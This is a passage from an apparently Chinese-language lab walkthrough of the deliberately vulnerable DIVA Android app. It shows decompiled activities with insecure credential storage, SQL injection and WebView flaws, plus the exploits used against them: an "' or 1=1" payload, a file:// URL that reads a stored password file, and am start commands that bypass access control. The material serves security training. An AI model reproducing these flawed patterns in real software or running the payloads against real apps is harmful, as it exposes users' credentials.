<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase mDB;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB = <span class="built_in">this</span>.openOrCreateDatabase(<span class="string">&quot;ids2&quot;</span>, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;CREATE TABLE IF NOT EXISTS myuser(user VARCHAR, password VARCHAR);&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;Error occurred while creating database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040024</span>);  <span class="comment">// layout:activity_insecure_data_storage2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008B</span>);  <span class="comment">// id:ids2Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008C</span>);  <span class="comment">// id:ids2Pwd</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO myuser VALUES (\&#x27;&quot;</span> + usr.getText().toString() + <span class="string">&quot;\&#x27;, \&#x27;&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;Error occurred while inserting into database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>账号密码存在sqllite</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127|root@shamu:/data/data/jakhar.aseem.diva/databases # sqlite3 ids2</span><br><span class="line">SQLite version 3.8.6.1 2015-05-21 17:24:32</span><br><span class="line">Enter &quot;.help&quot; for usage hints.</span><br><span class="line"></span><br><span class="line">sqlite&gt; .table</span><br><span class="line">android_metadata  myuser</span><br><span class="line">sqlite&gt; select * from myuser;</span><br><span class="line">xcc|qwerty</span><br></pre></td></tr></table></figure>

<h2 id="不安全的数据存储—第三部分"><a href="#不安全的数据存储—第三部分" class="headerlink" title="不安全的数据存储—第三部分"></a>不安全的数据存储—第三部分</h2><p>对应代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage3Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040025</span>);  <span class="comment">// layout:activity_insecure_data_storage3</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008E</span>);  <span class="comment">// id:ids3Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C008F</span>);  <span class="comment">// id:ids3Pwd</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">ddir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.getApplicationInfo().dataDir);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file1</span> <span class="operator">=</span> File.createTempFile(<span class="string">&quot;uinfo&quot;</span>, <span class="string">&quot;tmp&quot;</span>, ddir);</span><br><span class="line">            file1.setReadable(<span class="literal">true</span>);</span><br><span class="line">            file1.setWritable(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(file1);</span><br><span class="line">            fw.write(usr.getText().toString() + <span class="string">&quot;:&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            fw.close();</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;File error occurred&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;File error: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>藏在临时文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/data/data/jakhar.aseem.diva # cat uinfo-382362279tmp</span><br><span class="line">xcc:qwerty</span><br></pre></td></tr></table></figure>

<h2 id="不安全的数据存储—第四部分"><a href="#不安全的数据存储—第四部分" class="headerlink" title="不安全的数据存储—第四部分"></a>不安全的数据存储—第四部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.Environment;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InsecureDataStorage4Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040026</span>);  <span class="comment">// layout:activity_insecure_data_storage4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">saveCredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">usr</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0092</span>);  <span class="comment">// id:ids4Usr</span></span><br><span class="line">        <span class="type">EditText</span> <span class="variable">pwd</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0093</span>);  <span class="comment">// id:ids4Pwd</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file0</span> <span class="operator">=</span> Environment.getExternalStorageDirectory();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">uinfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(file0.getAbsolutePath() + <span class="string">&quot;/.uinfo.txt&quot;</span>);</span><br><span class="line">            uinfo.setReadable(<span class="literal">true</span>);</span><br><span class="line">            uinfo.setWritable(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">FileWriter</span> <span class="variable">fw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriter</span>(uinfo);</span><br><span class="line">            fw.write(usr.getText().toString() + <span class="string">&quot;:&quot;</span> + pwd.getText().toString() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            fw.close();</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;3rd party credentials saved successfully!&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;File error occurred&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            Log.d(<span class="string">&quot;Diva&quot;</span>, <span class="string">&quot;File error: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存储sd卡的目录一般在： &#x2F;mnt&#x2F;sdcard</p>
<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/mnt/sdcard # ls -la</span><br><span class="line">-rw-rw---- root     sdcard_r       11 2023-03-25 18:15 .uinfo.txt</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Alarms</span><br><span class="line">drwxrwx--x root     sdcard_r          2023-02-06 13:46 Android</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:29 Apps</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 DCIM</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:51 Download</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:50 MT2</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Movies</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Music</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Notifications</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 16:29 Pictures</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Podcasts</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-02-06 13:46 Ringtones</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-19 22:38 tencent</span><br><span class="line">drwxrwx--- root     sdcard_r          2023-03-25 15:58 theme</span><br><span class="line">root@shamu:/mnt/sdcard # cat .uinfo.txt</span><br><span class="line">xcc:qwerty</span><br></pre></td></tr></table></figure>

<h2 id="输入校验问题—第一部分"><a href="#输入校验问题—第一部分" class="headerlink" title="输入校验问题—第一部分"></a>输入校验问题—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.database.Cursor;</span><br><span class="line"><span class="keyword">import</span> android.database.sqlite.SQLiteDatabase;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SQLInjectionActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> SQLiteDatabase mDB;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mDB = <span class="built_in">this</span>.openOrCreateDatabase(<span class="string">&quot;sqli&quot;</span>, <span class="number">0</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;DROP TABLE IF EXISTS sqliuser;&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;CREATE TABLE IF NOT EXISTS sqliuser(user VARCHAR, password VARCHAR, credit_card VARCHAR);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;admin\&#x27;, \&#x27;passwd123\&#x27;, \&#x27;1234567812345678\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;diva\&#x27;, \&#x27;p@ssword\&#x27;, \&#x27;1111222233334444\&#x27;);&quot;</span>);</span><br><span class="line">            <span class="built_in">this</span>.mDB.execSQL(<span class="string">&quot;INSERT INTO sqliuser VALUES (\&#x27;john\&#x27;, \&#x27;password123\&#x27;, \&#x27;5555666677778888\&#x27;);&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva-sqli&quot;</span>, <span class="string">&quot;Error occurred while creating database for SQLI: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040029</span>);  <span class="comment">// layout:activity_sqlinjection</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">search</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">srchtxt</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0099</span>);  <span class="comment">// id:ivi1search</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Cursor</span> <span class="variable">cursor0</span> <span class="operator">=</span> <span class="built_in">this</span>.mDB.rawQuery(<span class="string">&quot;SELECT * FROM sqliuser WHERE user = \&#x27;&quot;</span> + srchtxt.getText().toString() + <span class="string">&quot;\&#x27;&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">strb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cursor0 != <span class="literal">null</span> &amp;&amp; cursor0.getCount() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                cursor0.moveToFirst();</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    strb.append(<span class="string">&quot;User: (&quot;</span> + cursor0.getString(<span class="number">0</span>) + <span class="string">&quot;) pass: (&quot;</span> + cursor0.getString(<span class="number">1</span>) + <span class="string">&quot;) Credit card: (&quot;</span> + cursor0.getString(<span class="number">2</span>) + <span class="string">&quot;)\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(cursor0.moveToNext());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                strb.append(<span class="string">&quot;User: (&quot;</span> + srchtxt.getText().toString() + <span class="string">&quot;) not found&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, strb.toString(), <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            Log.d(<span class="string">&quot;Diva-sqli&quot;</span>, <span class="string">&quot;Error occurred while searching in database: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1‘ or 1=1</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230325182536117.png" alt="image-20230325182536117"></p>
<h2 id="输入校验问题—第二部分"><a href="#输入校验问题—第二部分" class="headerlink" title="输入校验问题—第二部分"></a>输入校验问题—第二部分</h2><p>代码:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.webkit.WebView;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InputValidation2URISchemeActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">get</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">EditText</span> <span class="variable">uriText</span> <span class="operator">=</span> (EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0081</span>);  <span class="comment">// id:ivi2uri</span></span><br><span class="line">        ((WebView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0083</span>)).loadUrl(uriText.getText().toString());  <span class="comment">// id:ivi2wview</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040021</span>);  <span class="comment">// layout:activity_input_validation2_urischeme</span></span><br><span class="line">        ((WebView)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C0083</span>)).getSettings().setJavaScriptEnabled(<span class="literal">true</span>);  <span class="comment">// id:ivi2wview</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>将http协议换成File协议，查看之前存储在sd卡的账号文件</p>
<p>输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file:///mnt/sdcard/.uinfo.txt</span><br></pre></td></tr></table></figure>

<h3 id="webview域控制不严格漏洞"><a href="#webview域控制不严格漏洞" class="headerlink" title="webview域控制不严格漏洞"></a>webview域控制不严格漏洞</h3><p>先看Android里的WebViewActivity.java，当其他应用启动此 Activity 时， intent 中的 data 直接被当作 url 来加载（假定传进来的 url 为 file:&#x2F;&#x2F;&#x2F;data&#x2F;local&#x2F;tmp&#x2F;attack.html ），其他 APP 通过使用显式 ComponentName 或者其他类似方式就可以很轻松的启动该WebViewActivity 并加载恶意url。</p>
<p>解决方案：</p>
<p>对于不需要使用 file 协议的应用，禁用 file 协议.</p>
<p>对于需要使用 file 协议的应用，禁止 file 协议加载 JavaScript。</p>
<p>方法分析：</p>
<p>1、setAllowFileAccess()<br>使用 file 域加载的 js代码能够使用进行同源策略跨域访问，从而导致隐私信息泄露，如果不允许使用 file 协议，则不会存在上述的威胁，但同时也限制了 WebView 的功能，使其不能加载本地的 html 文件。</p>
<p>2、setAllowFileAccessFromFileURLs()<br>设置为false，禁止从 file url 中加载的 js 代码读取其它本地文件，在Android 4.1前默认允许，在Android 4.1后默认禁止。</p>
<p>3、setAllowUniversalAccessFromFileURLs()<br>设置为false，禁止从 file url 中加载的 js 代码可以访问其他的源(包括http、https等源)。</p>
<h2 id="访问控制问题—第一部分"><a href="#访问控制问题—第一部分" class="headerlink" title="访问控制问题—第一部分"></a>访问控制问题—第一部分</h2><p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl1Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F040019</span>);  <span class="comment">// layout:activity_access_control1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewAPICredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        i.setAction(<span class="string">&quot;jakhar.aseem.diva.action.VIEW_CREDS&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(i.resolveActivity(<span class="built_in">this</span>.getPackageManager()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.startActivity(i);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;Error while getting API details&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        Log.e(<span class="string">&quot;Diva-aci1&quot;</span>, <span class="string">&quot;Couldn\&#x27;t resolve the Intent VIEW_CREDS to our activity&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过程：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@shamu:/ # am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">Starting: Intent &#123; act=android.intent.action.MAIN cat=[android.intent.category.LAUNCHER] cmp=jakhar.aseem.diva/.APICredsActivity &#125;</span><br><span class="line"></span><br><span class="line">am start -n jakhar.aseem.diva/jakhar.aseem.diva.APICredsActivity</span><br><span class="line">am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS</span><br></pre></td></tr></table></figure>

<p>对应解释：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">中文解释下：am start jakhar.aseem.diva/.APICredsActivity</span><br><span class="line">这是一个Android系统中的命令，用于启动一个应用程序的特定活动（Activity）。其中，“am”代表Activity Manager，它是一个管理Android应用程序中活动（Activity）的系统服务。</span><br><span class="line">具体来说，“start”是am命令的一种操作类型，用于启动一个活动。接下来是“jakhar.aseem.diva”，它代表应用程序的包名，即Diva应用程序的包名。最后是“/.APICredsActivity”，它代表要启动的具体活动名称，即APICredsActivity。因此，该命令的含义是启动名为APICredsActivity的Diva应用程序活动。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">为什么/.APICredsActivity 有个点</span><br><span class="line">在 Android 中，点号（.）在活动（Activity）名称前面表示该活动是应用程序的子活动，即它是在包含该活动的应用程序的命名空间中定义的。因此，点号（.）后面跟着的是子活动的名称，而不是完整的活动类名。这样可以简化指定活动名称的过程，并使活动名称更具可读性。</span><br><span class="line">在这个例子中，由于点号（.）在活动名称前面，因此它表示 APICredsActivity 是 Diva 应用程序的子活动，即该活动是在 Diva 应用程序的命名空间中定义的。这样就不需要指定完整的活动类名，只需指定子活动名称即可。</span><br><span class="line"></span><br><span class="line">如果不使用点号，那么在命令中应该指定完整的活动类名。例如，如果要启动 Diva 应用程序中的 APICredsActivity，可以使用以下命令：</span><br><span class="line">am start -n jakhar.aseem.diva/jakhar.aseem.diva.APICredsActivity</span><br><span class="line">其中，“-n”选项用于指定要启动的活动的完整类名，其中包括应用程序包名和活动名称。所以，上面的命令将启动 jakhar.aseem.diva 应用程序中的 jakhar.aseem.diva.APICredsActivity 活动。</span><br></pre></td></tr></table></figure>

<h2 id="访问控制问题—第二部分"><a href="#访问控制问题—第二部分" class="headerlink" title="访问控制问题—第二部分"></a>访问控制问题—第二部分</h2><p>代码：</p>
<p>accesscontrolaction：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> jakhar.aseem.diva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.RadioButton;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AccessControl2Activity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// android.support.v7.app.AppCompatActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F04001A</span>);  <span class="comment">// layout:activity_access_control2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">viewAPICredentials</span><span class="params">(View view)</span> &#123;</span><br><span class="line">        <span class="type">RadioButton</span> <span class="variable">rbregnow</span> <span class="operator">=</span> (RadioButton)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0C006D</span>);  <span class="comment">// id:aci2rbregnow</span></span><br><span class="line">        <span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">z</span> <span class="operator">=</span> rbregnow.isChecked();</span><br><span class="line">        i.setAction(<span class="string">&quot;jakhar.aseem.diva.action.VIEW_CREDS2&quot;</span>);</span><br><span class="line">        i.putExtra(<span 